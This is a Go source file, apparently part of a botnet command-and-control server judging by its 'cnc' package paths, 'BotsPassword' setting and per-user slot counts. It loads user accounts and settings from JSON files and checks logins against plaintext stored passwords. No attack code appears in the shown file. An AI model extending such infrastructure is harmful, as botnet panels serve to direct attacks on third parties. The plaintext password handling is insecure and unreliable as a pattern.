package config

import (
	"cnc/internal/models"
	"cnc/internal/state"
	"encoding/json"
	"fmt"
	"os"
)

func LoadUsers() {
	state.UsersMutex.Lock()
	defer state.UsersMutex.Unlock()

	currentLoginState := make(map[string]bool)
	currentSlots := make(map[string]int)
	for i := 0; i < state.UserCount; i++ {
		currentLoginState[state.Users[i].User] = state.Users[i].IsLoggedIn
		currentSlots[state.Users[i].User] = state.Users[i].CurrentSlots
	}

	state.UserCount = 0

	file, err := os.ReadFile("database/logins.json")
	if err != nil {
		fmt.Println("Failed to open database/logins.json:", err)
		return
	}

	var loadedUsers []models.User
	if err := json.Unmarshal(file, &loadedUsers); err != nil {
		fmt.Println("Failed to parse database/logins.json:", err)
		return
	}

	for i := 0; i < len(loadedUsers) && i < models.MAX_USERS; i++ {
		state.Users[i] = loadedUsers[i]
		if isLoggedIn, exists := currentLoginState[state.Users[i].User]; exists {
			state.Users[i].IsLoggedIn = isLoggedIn
		} else {
			state.Users[i].IsLoggedIn = false
		}

		if currentSlot, exists := currentSlots[state.Users[i].User]; exists {
			state.Users[i].CurrentSlots = currentSlot
		} else {
			state.Users[i].CurrentSlots = 0
		}

		state.UserCount++
	}
}

func ReadSettings() (models.Settings, error) {
	var settings models.Settings
	file, err := os.ReadFile("database/settings.json")
	if err != nil {
		return settings, err
	}
	err = json.Unmarshal(file, &settings)
	if settings.MaxGlobalSlots == 0 {
		settings.MaxGlobalSlots = 10
	}
	state.Password = settings.BotsPassword
	return settings, err
}

func ReadLogSettings() (filelogs bool, logips bool) {
	filelogs = true
	logips = true

	file, err := os.ReadFile("database/settings.json")
	if err != nil {
		fmt.Println("Warning: Could not read settings.json, using default log settings.")
		return
	}

	var settings models.LogSettings
	if err := json.Unmarshal(file, &settings); err != nil {
		fmt.Println("Warning: Could not parse settings.json, using default log settings.")
		return
	}

	return settings.FileLogs, settings.LogIPs
}

func CheckLogin(user, pass string) int {
	state.UsersMutex.Lock()
	defer state.UsersMutex.Unlock()

	for i := 0; i < state.UserCount; i++ {
		if user == state.Users[i].User && pass == state.Users[i].Pass {
			if state.Users[i].IsLoggedIn {
				return -2
			}
			return i
		}
	}
	return -1
}
